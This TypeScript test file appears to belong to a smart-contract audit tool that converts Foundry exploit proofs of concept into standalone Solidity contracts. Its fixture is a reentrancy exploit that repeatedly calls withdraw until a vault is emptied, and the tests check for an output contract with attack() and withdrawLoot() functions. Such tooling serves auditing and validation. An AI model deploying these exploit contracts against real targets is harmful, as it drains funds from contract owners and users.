// src/lib/audit/convert-foundry.test.ts
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  extractSolidityCode,
  buildFoundryToPlainSolidityPrompt,
  convertFoundryToPlainSolidityFallback,
  convertFoundryToPlainSolidity,
} from "./convert-foundry.server.ts";

describe("Foundry to Plain Solidity Converter", () => {
  const sampleFoundryTest = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IVault {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}

contract PoC is Test {
    IVault target;
    address attacker;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        target = IVault(vm.envAddress("POC_TARGET"));
        attacker = makeAddr("attacker");
        vm.deal(attacker, 5 ether);
    }

    function test_exploit() public {
        vm.startPrank(attacker);
        target.deposit{value: 1 ether}();
        target.withdraw(1 ether);
        vm.stopPrank();
        assertEq(address(target).balance, 0);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether);
        }
    }
}`;

  it("buildFoundryToPlainSolidityPrompt formats instructions with target and rules", () => {
    const prompt = buildFoundryToPlainSolidityPrompt(sampleFoundryTest, "VaultContract", "", {
      targetAddress: "0x1234567890123456789012345678901234567890",
      mode: "validation",
    });
    assert.match(prompt.system, /Plain Solidity contracts/);
    assert.match(prompt.user, /Target Contract Name: VaultContract/);
    assert.match(prompt.user, /Target Contract Address: 0x1234567890123456789012345678901234567890/);
    assert.match(prompt.user, /Conversion Mode: VALIDATION/);
    assert.match(prompt.user, /NO Foundry dependencies/);
    assert.match(prompt.user, /NO cheatcodes/);
    assert.match(prompt.user, /Standalone Contract Architecture/);
  });

  it("extractSolidityCode extracts code from markdown fence or raw text", () => {
    const markdown = "Here is the code:\n```solidity\ncontract Exploit {}\n```\nDone.";
    assert.equal(extractSolidityCode(markdown), "contract Exploit {}");

    const raw = "contract Exploit {}";
    assert.equal(extractSolidityCode(raw), "contract Exploit {}");
  });

  it("convertFoundryToPlainSolidityFallback removes forge-std and cheatcodes", () => {
    const converted = convertFoundryToPlainSolidityFallback(sampleFoundryTest, "Vault");

    // Must not have forge-std or Test inheritance
    assert.ok(!converted.includes('import "forge-std/Test.sol";'));
    assert.ok(!converted.includes("contract PoC is Test"));
    assert.ok(!converted.includes("vm.createSelectFork"));
    assert.ok(!converted.includes("vm.startPrank"));
    assert.ok(!converted.includes("vm.stopPrank"));
    assert.ok(!converted.includes("assertEq("));

    // Must include plain Solidity contract structure
    assert.ok(converted.includes("contract VaultExploit"));
    assert.ok(converted.includes("function attack() external payable"));
    assert.ok(converted.includes("function withdrawLoot() external"));
    assert.ok(converted.includes("receive() external payable"));
    assert.ok(converted.includes("interface IVault"));
  });

  it("convertFoundryToPlainSolidity returns fallback result when API key is unconfigured", async () => {
    const result = await convertFoundryToPlainSolidity(sampleFoundryTest, "Vault");
    assert.ok(result.plainSolidityCode);
    assert.equal(typeof result.plainSolidityCode, "string");
    assert.ok(result.plainSolidityCode.includes("contract VaultExploit"));
    assert.equal(result.source, "fallback");
    assert.ok(result.durationMs >= 0);
  });

  it("throws if empty code is provided", async () => {
    await assert.rejects(async () => {
      await convertFoundryToPlainSolidity("   ");
    }, /Foundry test code is required/);
  });
});
